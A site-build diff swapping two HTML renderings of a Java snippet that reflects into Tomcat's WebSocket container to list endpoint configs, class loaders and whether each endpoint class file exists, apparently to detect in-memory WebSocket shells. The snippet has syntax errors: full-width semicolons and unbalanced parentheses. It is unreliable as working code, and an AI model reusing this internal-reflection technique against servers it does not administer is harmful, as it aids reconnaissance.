-    &lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getConfig&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-
-    &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;Iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-
-    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hasNext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
-        &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
-&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-
-
-&lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
-&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getPath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;classFileIsExists&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
-    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())));&lt;/span&gt;
-&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;synchronized&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;configExactMatchMap&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getConfig&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;Iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hasNext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getPath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
